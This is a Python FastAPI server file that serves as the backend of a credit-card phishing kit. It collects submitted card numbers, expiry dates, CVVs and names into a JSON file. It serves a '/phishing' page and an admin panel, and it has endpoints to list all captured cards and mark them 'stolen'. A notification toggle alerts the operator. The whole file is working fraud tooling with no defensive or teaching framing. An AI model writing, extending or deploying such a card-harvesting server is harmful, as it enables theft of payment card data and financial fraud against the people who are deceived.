from fastapi import FastAPI
from fastapi.middleware.cors import CORSMiddleware
from fastapi.responses import FileResponse
from pydantic import BaseModel
from datetime import datetime
import json, os

app = FastAPI()

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_methods=["*"],
    allow_headers=["*"],
)

CARDS_FILE        = "cards.json"
NOTIF_FILE        = "notif_state.json"


# ── Helpers ──────────────────────────────────────────────

def load_cards():
    if os.path.exists(CARDS_FILE):
        with open(CARDS_FILE) as f:
            return json.load(f)
    return []

def save_cards(cards):
    with open(CARDS_FILE, "w") as f:
        json.dump(cards, f, ensure_ascii=False, indent=2)

def load_notif():
    if os.path.exists(NOTIF_FILE):
        with open(NOTIF_FILE) as f:
            return json.load(f)
    return {"triggered": False}

def save_notif(state):
    with open(NOTIF_FILE, "w") as f:
        json.dump(state, f)


# ── Models ───────────────────────────────────────────────

class CardData(BaseModel):
    number: str
    expiry: str
    cvv: str = ""
    name: str = "Noma'lum"


# ── Notification endpoints ───────────────────────────────

@app.post("/api/notify")
def trigger_notification():
    save_notif({"triggered": True})
    return {"success": True}

@app.get("/api/notification-status")
def notification_status():
    return load_notif()

@app.post("/api/notification-ack")
def ack_notification():
    save_notif({"triggered": False})
    return {"success": True}


# ── Card endpoints ───────────────────────────────────────

@app.post("/api/card")
def save_card(data: CardData):
    cards = load_cards()
    card = {
        "id": len(cards) + 1,
        "number": data.number,
        "expiry": data.expiry,
        "cvv": data.cvv,
        "name": data.name,
        "time": datetime.now().strftime("%H:%M:%S"),
        "status": "pending",
    }
    cards.append(card)
    save_cards(cards)
    return {"success": True}

@app.get("/api/cards")
def get_cards():
    return load_cards()

@app.post("/api/cards/{card_id}/steal")
def mark_stolen(card_id: int):
    cards = load_cards()
    for c in cards:
        if c["id"] == card_id:
            c["status"] = "stolen"
    save_cards(cards)
    return {"success": True}

@app.delete("/api/cards")
def clear_cards():
    save_cards([])
    return {"success": True}


# ── Pages ────────────────────────────────────────────────

@app.get("/admin")
def admin_page():
    return FileResponse(os.path.join(os.path.dirname(__file__), "admin.html"))

@app.get("/notification")
def notif_page():
    base = os.path.dirname(os.path.dirname(__file__))
    return FileResponse(os.path.join(base, "Ali", "notification.html"))

@app.get("/phishing")
def phishing_page():
    base = os.path.dirname(os.path.dirname(__file__))
    return FileResponse(os.path.join(base, "Ali", "phishing.html"))


if __name__ == "__main__":
    import uvicorn
    uvicorn.run("server:app", host="0.0.0.0", port=8001, reload=True)
